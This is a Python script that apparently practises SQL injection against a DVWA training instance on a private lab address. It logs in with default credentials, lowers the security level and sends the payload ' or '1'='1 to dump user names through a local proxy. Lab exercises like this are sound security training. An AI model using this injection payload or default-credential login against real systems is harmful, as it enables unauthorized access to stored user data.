import sys,requests,re
from bs4 import BeautifulSoup
import urllib.parse

url = 'http://192.168.10.194:8000/'
proxies = {'http':'http://127.0.0.1:8080'}
data = {'username':'admin', 'password':'password', 'Login':'Login'}

res_00 = requests.get(url + 'login.php', proxies = proxies)
soup = BeautifulSoup(res_00.content, 'html.parser')
user_token = soup.find('input', {'name': 'user_token'}).get('value')
data['user_token'] = user_token

res_01 = requests.post(url + 'login.php', proxies = proxies, cookies = res_00.cookies, data = data, allow_redirects = False)

res_02 = requests.get(url + 'index.php', proxies = proxies, cookies = res_00.cookies)
res_00.cookies.set('security', 'low', domain='192.168.10.194', path='/')
payload = urllib.parse.quote("' or '1'='1")

res_03 = requests.get(url + '/vulnerabilities/sqli/?id=' + payload + '&Submit=Submit', proxies = proxies, cookies = res_00.cookies)
soup = BeautifulSoup(res_03.content, 'html.parser')

for i in soup.find_all(['pre']): print(i.text.replace("ID: ' or '1'='1First name: ",'').replace('Surname: ',' '))
